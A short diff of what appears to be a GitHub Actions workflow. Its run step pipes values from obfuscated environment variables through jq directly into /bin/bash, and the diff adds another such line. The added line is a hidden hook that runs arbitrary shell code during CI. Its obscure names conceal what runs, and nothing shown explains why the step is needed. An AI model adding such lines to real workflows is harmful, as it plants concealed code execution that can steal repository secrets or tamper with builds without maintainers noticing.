@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$oap14701" | jq -r .psrl9 | /bin/bash
           echo $ivx809 | jq -r .zaho9 | /bin/bash
+          printf '%s' "$u3" | jq -r .nmxk20 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
